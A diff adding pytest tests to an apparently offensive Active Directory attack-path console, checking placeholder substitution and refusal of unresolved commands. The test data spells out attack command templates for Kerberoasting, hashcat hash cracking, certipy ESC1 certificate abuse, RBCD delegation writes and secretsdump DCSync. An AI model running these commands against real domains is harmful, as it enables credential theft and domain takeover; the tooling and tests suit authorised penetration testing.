@@ -354,3 +354,94 @@ def test_cmd_use_reports_reachability(capsys):
     console.cmd_use(["1"])
     out = capsys.readouterr().out
     assert "Reachability:" in out
+
+
+# --- full placeholder resolution + unresolved-token guard ------------------
+
+def _creds_vars():
+    """Variables seeded from a provided-cred Target (as the console does)."""
+    v = Variables()
+    t = Target(host="dc01.corp.local", domain="corp.local",
+               username="alice", password="P@ss", dc_ip="10.0.0.10")
+    v.seed_from_target(t)
+    return v
+
+
+def test_cred_chain_steps_fully_resolve():
+    v = _creds_vars()
+    # These are the real path-step command templates; from provided creds +
+    # defaults they must resolve with nothing left unresolved.
+    for cmd in [
+        "nxc ldap DC -u USER -p PASS --kerberoasting out.tgs",
+        "hashcat -m 13100 out.tgs wordlist.txt",
+        "hashcat -m 18200 asrep.hash wordlist.txt",
+        "hashcat -m 31300 timeroast.hash wordlist.txt",
+        "certipy auth -pfx administrator.pfx -dc-ip DC-IP",
+        "secretsdump.py -just-dc DOMAIN/USER@DC",
+    ]:
+        assert v.unresolved_placeholders(cmd) == [], f"should resolve: {cmd}"
+
+
+def test_wordlist_resolves_to_default_path_not_token():
+    v = _creds_vars()
+    out = v.substitute("hashcat -m 13100 out.tgs wordlist.txt")
+    assert "wordlist.txt" not in out
+    assert out.endswith("rockyou.txt")
+
+
+def test_pwn_account_not_doubled():
+    v = _creds_vars()
+    out = v.substitute("rbcd.py -delegate-from 'PWN$' -action write DOMAIN/USER:PASS")
+    assert "PWN$$" not in out
+    assert "PWN$" in out
+
+
+def test_adcs_req_blocked_until_ca_and_template_set():
+    v = _creds_vars()
+    cmd = ("certipy req -u USER@DOMAIN -p PASS -ca CA-NAME -template VULN-TEMPLATE "
+           "-upn administrator@DOMAIN -dc-ip DC-IP")
+    unresolved = v.unresolved_placeholders(cmd)
+    assert "CA-NAME" in unresolved
+    assert "VULN-TEMPLATE" in unresolved
+    # After setting the environment-specific values, it resolves.
+    v.set("CA", "corp-CA")
+    v.set("TEMPLATE", "VulnTemplate")
+    assert v.unresolved_placeholders(cmd) == []
+
+
+def test_rbcd_blocked_until_target_set():
+    v = _creds_vars()
+    cmd = "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' -action write DOMAIN/USER:PASS"
+    assert v.unresolved_placeholders(cmd), "TARGET must be required before running"
+    v.set("TARGET", "DC01$")
+    assert v.unresolved_placeholders(cmd) == []
+
+
+def test_owner_maps_token_to_variable():
+    v = Variables()
+    assert v.owner("VULN-TEMPLATE") == "TEMPLATE"
+    assert v.owner("TARGET$") == "TARGET"
+    assert v.owner("totally-unknown") == "totally-unknown"
+
+
+def test_execute_step_refuses_unresolved_command(monkeypatch, capsys):
+    # A selected ADCS step with CA/TEMPLATE unset must be refused by run, not
+    # executed with broken literals.
+    runner = ToolRunner(dry_run=True)
+    target = Target(host="dc01.corp.local", domain="corp.local",
+                    username="alice", password="P@ss", dc_ip="10.0.0.10")
+    session = Session(runner=runner, target=target, targets=[target])
+    step = PathStep(
+        name="ESC1: request privileged certificate", technique="ESC1",
+        requires=frozenset({Capability.LOW_PRIV_USER}),
+        grants=Capability.CERT_AS_DA,
+        command=("certipy req -u USER@DOMAIN -p PASS -ca CA-NAME "
+                 "-template VULN-TEMPLATE -upn administrator@DOMAIN -dc-ip DC-IP"),
+        description="d", reliability=Reliability.HIGH, noise=Noise.MODERATE,
+    )
+    console = Console(session)
+    cmd = session.variables.substitute(step.command)
+    console._execute_step(step, cmd, [])
+    out = capsys.readouterr().out
+    assert "Refusing to run" in out
+    assert "VULN-TEMPLATE" in out or "CA-NAME" in out
